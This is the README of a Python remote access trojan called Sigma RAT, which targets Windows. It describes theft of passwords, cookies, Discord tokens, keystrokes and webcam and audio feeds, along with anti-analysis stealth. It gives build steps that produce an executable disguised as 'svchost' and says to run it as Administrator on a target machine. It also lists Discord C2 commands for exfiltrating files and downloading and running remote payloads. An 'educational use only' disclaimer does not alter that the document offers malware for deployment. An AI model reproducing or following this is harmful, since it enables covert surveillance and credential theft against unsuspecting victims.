# Sigma RAT
A highly advanced Remote Access Tool by WPfluxxy (Educational Use Only)

## Overview
Sigma RAT is a sophisticated Python-based RAT with stealth, real-time control, and extensive surveillance capabilities. Use responsibly!

## What It Does
- **Collects**: System info, browser data (passwords, cookies, history), Discord tokens/backup codes, clipboard, files, Wi-Fi, keylogs, network packets.
- **Media**: Screenshots, webcam, audio, screen recordings.
- **Streams**: Encrypted live screen feed.
- **Controls**: C2 via Discord, reverse shell, file exfil/exec, self-destruct.
- **Stealth**: Process injection, polymorphism, encrypted comms, hidden files, anti-VM/debug.

## Requirements
- **Target**: Windows PC.
- **Builder**: Python 3.8+, admin rights for scapy. Ensure Python is installed and accessible via `python` or a specific path (e.g., `C:\Python39\python.exe`).
- **Webhook**: Discord webhook URL.
- **Server**: Machine for streaming/shell.

## Setup for Different Computers
1. **Install Python (if not installed)**:
   - Download and install Python 3.8 or higher from [python.org](https://www.python.org/downloads/windows/). Ensure "Add Python to PATH" is checked during installation.
   - Verify Python works by opening CMD and running `python --version`.

2. **Install Dependencies**:
   - Navigate to the Sigma RAT folder (e.g., `C:\Path\To\SigmaRAT`) in CMD.
   - Run:
     ```
     python -m pip install --upgrade pip
     python -m pip install -r requirements.txt
     ```
   - If `python` isn’t recognized, find your Python executable (e.g., `C:\Python39\python.exe`) and use:
     ```
     C:\Python39\python.exe -m pip install --upgrade pip
     C:\Python39\python.exe -m pip install -r requirements.txt
     ```

3. **Run `stream_server.py` on the server**:
   - Use your Python executable:
     ```
     python stream_server.py
     ```
   - Or, if `python` isn’t in PATH:
     ```
     C:\Python39\python.exe stream_server.py
     ```

4. **Run `builder.bat`**:
   - Open `builder.bat` and, when prompted, enter the full path to your Python executable (e.g., `C:\Python39\python.exe`). Press Enter to use `python` if it’s in your PATH.
   - Input your Discord webhook URL, server IP, and port when prompted.
   - Check the `dist` folder for `svchost_[random].exe`.

5. **Deploy and Run**:
   - Copy `svchost_[random].exe` to the target Windows machine and run it as Administrator.

## Commands
- `!screenshot`: Capture screenshot.
- `!shutdown`: Shut down target.
- `!exfil <path>`: Upload file.
- `!exec <url>`: Download and run file.
- `!selfdestruct`: Delete RAT.

## Warning
For **educational purposes only**. Misuse is illegal.

## Credits
- WPfluxxy